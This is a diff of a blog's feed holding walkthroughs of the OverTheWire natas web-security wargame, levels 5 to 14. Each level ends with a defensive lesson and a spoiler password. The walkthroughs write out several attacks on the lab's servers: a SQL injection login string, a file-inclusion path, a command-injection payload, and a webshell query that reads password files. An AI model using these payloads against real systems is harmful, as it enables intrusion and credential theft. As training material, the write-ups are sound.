+Retrieve the password for the next level by opening the url &lt;a href=&quot;view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14&quot;&gt;view-source:http://natas13.natas.labs.overthewire.org/upload/7eifk4vmf9.php?test=cat%20/etc/natas_webpass/natas14&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Checking file type is not enough&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
@@ -3081,7 +3111,8 @@ Retrieve the password for the next level by opening the url &lt;a href=&quot;vie
 &lt;h2 id=&quot;level-14&quot;&gt;&lt;a href=&quot;http://natas14.natas.labs.overthewire.org/&quot;&gt;Level 14&lt;/a&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/blog/natas/natas14-1.png&quot; alt=&quot;Natas 14 landing page&quot; /&gt;
 We are met with a username/password login page, and sourcecode.&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'natas14'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;censored&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'natas14'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -3111,12 +3142,20 @@ Password: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span c
 The query checks the username and password, and if it finds a result, we get the password we want. 
 Otherwise we are denied.
 The glaring error on this page is &lt;a href=&quot;https://www.owasp.org/index.php/SQL_Injection&quot;&gt;SQL injection&lt;/a&gt;.
-Use username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot; OR 1=1 -- -&lt;/code&gt; for instant win.&lt;br /&gt;
-&lt;em&gt;SQL injection flaws are more common than you think&lt;/em&gt;&lt;/p&gt;
+Use username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot; OR 1=1 -- -&lt;/code&gt; for instant win.&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;SQL injection flaws are more common than you think&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
-&lt;/details&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Read Previous - OverTheWire level 5-9 walkthrough. Introduction OverTheWire is a wargame site with several challenges. It contains several challenges with a nice increase in difficulty. This is the third entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry><entry><title type="html">OverTheWire natas 5-9</title><link href="https://fjank.no/blog/2019-03-17-overthewire-natas-5-9/" rel="alternate" type="text/html" title="OverTheWire natas 5-9" /><published>2019-03-17T00:00:00+01:00</published><updated>2021-04-11T13:18:06+02:00</updated><id>https://fjank.no/blog/overthewire-natas-5-9</id><content type="html" xml:base="https://fjank.no/blog/2019-03-17-overthewire-natas-5-9/">&lt;p&gt;&lt;a href=&quot;/blog/2019-03-14-overthewire-natas-0-4/&quot;&gt;Read Previous - OverTheWire level 0-4 walkthrough.&lt;/a&gt;&lt;/p&gt;
+&lt;/details&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction Introduction OverTheWire is a wargame site with several challenges. It contains several challenges with a nice increase in difficulty. This is the third entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry><entry><title type="html">OverTheWire natas 5-9</title><link href="https://fjank.no/blog/2019-03-17-overthewire-natas-5-9/" rel="alternate" type="text/html" title="OverTheWire natas 5-9" /><published>2019-03-17T00:00:00+01:00</published><updated>2021-04-11T15:01:20+02:00</updated><id>https://fjank.no/blog/overthewire-natas-5-9</id><content type="html" xml:base="https://fjank.no/blog/2019-03-17-overthewire-natas-5-9/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-5&quot; id=&quot;markdown-toc-level-5&quot;&gt;Level 5&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-6&quot; id=&quot;markdown-toc-level-6&quot;&gt;Level 6&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-7&quot; id=&quot;markdown-toc-level-7&quot;&gt;Level 7&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-8&quot; id=&quot;markdown-toc-level-8&quot;&gt;Level 8&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-9&quot; id=&quot;markdown-toc-level-9&quot;&gt;Level 9&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&quot;http://overthewire.org&quot;&gt;OverTheWire&lt;/a&gt; is a wargame site with several challenges.
 For a beginner it contains several challenges with a nice increase in
@@ -3158,7 +3197,7 @@ result, you will see the the server is now happy, and gives you the password for
 &lt;p&gt;Also take a look at the raw tab, to see what you actually sent to the server. You could also change the values directly 
 in the raw tab.&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Don’t store data at all in the cookies, they are easily spoofed.&lt;/em&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Don’t store data at all in the cookies, they are easily spoofed.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
@@ -3171,10 +3210,11 @@ So obviously we need to find the correct secret to solve this one.
 &lt;img src=&quot;/assets/img/overthewire-natas6-1.png&quot; alt=&quot;Natas 6 landing page&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Lets take a look at the included source code:&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas6&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;natas6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;includes/secret.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'secret'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -3206,7 +3246,7 @@ A request for &lt;a href=&quot;http://natas6.natas.labs.overthewire.org/includes
 secret is exposed. Now it’s just a matter of writing in the correct secret and submit, then you get the password for the
 next level.&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;If you have files with sensitive data, don’t leave them in the web-published folder. They will be found.&lt;/em&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;If you have files with sensitive data, don’t leave them in the web-published folder. They will be found.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
@@ -3230,7 +3270,7 @@ As was stated in the beginning of the challenges, the passwords are stored at &l
 so we should try to use that as a page &lt;a href=&quot;http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8&quot;&gt;natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8&lt;/a&gt;
 That should give us the password for the next level.&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Don’t trust parameters from the browser. Never put un-sanitized data into an php include. Don’t expose error messages to the browser.&lt;/em&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Don’t trust parameters from the browser. Never put un-sanitized data into an php include. Don’t expose error messages to the browser.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
@@ -3241,11 +3281,12 @@ That should give us the password for the next level.&lt;/p&gt;
 to the server-side code. 
 &lt;img src=&quot;/assets/img/overthewire-natas8-1.png&quot; alt=&quot;Natas 8 landing page&quot; /&gt;
 Lets take a look at the included source code:&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas8&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;natas8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;
 
 &lt;span class=&quot;nv&quot;&gt;$encodedSecret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3d3d516343746d4d6d6c315669563362&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
@@ -3301,7 +3342,8 @@ functions: &lt;a href=&quot;http://php.net/manual/en/function.hex2bin.php&quot;&
 Or you could use your favourite programming language, or probably even a standard shell.
 Quickest way for me was to use &lt;a href=&quot;https://www.python.org/&quot;&gt;python&lt;/a&gt;, which should give you the correct secret to use to get the password
 for the lext level:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;reverse.py&quot;
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;encodedSecret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'3d3d516343746d4d6d6c315669563362'&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;reversed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodedSecret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ISO-8859-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -3310,7 +3352,7 @@ for the lext level:&lt;/p&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;em&gt;If you want to encrypt something, use a one-way encryption algorithm. Encodings like this are easily broken.&lt;/em&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;If you want to encrypt something, use a one-way encryption algorithm. Encodings like this are easily broken.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
@@ -3320,17 +3362,18 @@ for the lext level:&lt;/p&gt;
 &lt;p&gt;We are on this level met with something that looks like a search. inputting various text into the search gives us a list
 of the words that contain the input. This time also they have been kind enough to give us the server source code.
 &lt;img src=&quot;/assets/img/overthewire-natas9-1.png&quot; alt=&quot;Natas 9 landing page&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;natas9&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
-Find words containing: &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;needle&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Search&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;natas9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;containing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;needle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Search&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 
 
-Output:
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
+&lt;span class=&quot;nc&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;needle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -3366,14 +3409,21 @@ So, by entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Seems we got the directory listing, so command injection was successful.
 It should now be quite easy to get the password for the next level using &lt;a href=&quot;https://ss64.com/bash/cat.html&quot;&gt;cat&lt;/a&gt;.&lt;br /&gt;
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nonono dictionary.txt;cat /etc/natas_webpass/natas10; #&lt;/code&gt;&lt;br /&gt;
-&lt;em&gt;Avoid user controlled input to include/passtru or similar in other languages. If unavoidable, at least sanitize the input first.&lt;/em&gt;&lt;/p&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nonono dictionary.txt;cat /etc/natas_webpass/natas10; #&lt;/code&gt;&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Avoid user controlled input to include/passtru or similar in other languages. If unavoidable, at least sanitize the input first.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;Spoiler&lt;/summary&gt;
   natas10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
-&lt;/details&gt;
-
-&lt;p&gt;&lt;a href=&quot;/blog/2019-03-18-overthewire-natas-10-14/&quot;&gt;Read Next - OverTheWire level 10-14 walkthrough.&lt;/a&gt;&lt;/p&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Read Previous - OverTheWire level 0-4 walkthrough. Introduction OverTheWire is a wargame site with several challenges. For a beginner it contains several challenges with a nice increase in difficulty. This is the second entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry><entry><title type="html">OverTheWire natas 0-4</title><link href="https://fjank.no/blog/2019-03-14-overthewire-natas-0-4/" rel="alternate" type="text/html" title="OverTheWire natas 0-4" /><published>2019-03-14T00:00:00+01:00</published><updated>2021-04-11T12:53:14+02:00</updated><id>https://fjank.no/blog/overthewire-natas-0-4</id><content type="html" xml:base="https://fjank.no/blog/2019-03-14-overthewire-natas-0-4/">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;/details&gt;</content><author><name>Frank Karlstrøm</name></author><category term="blog" /><summary type="html">Introduction Introduction OverTheWire is a wargame site with several challenges. For a beginner it contains several challenges with a nice increase in difficulty. This is the second entry of a writeup of the natas challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process of searching for and finding vulnerabilities.</summary></entry><entry><title type="html">OverTheWire natas 0-4</title><link href="https://fjank.no/blog/2019-03-14-overthewire-natas-0-4/" rel="alternate" type="text/html" title="OverTheWire natas 0-4" /><published>2019-03-14T00:00:00+01:00</published><updated>2021-04-11T14:10:54+02:00</updated><id>https://fjank.no/blog/overthewire-natas-0-4</id><content type="html" xml:base="https://fjank.no/blog/2019-03-14-overthewire-natas-0-4/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-0&quot; id=&quot;markdown-toc-level-0&quot;&gt;Level 0&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#level-1&quot; id=&quot;markdown-toc-level-1&quot;&gt;Level 1&lt;/a&gt;&lt;/li&gt;
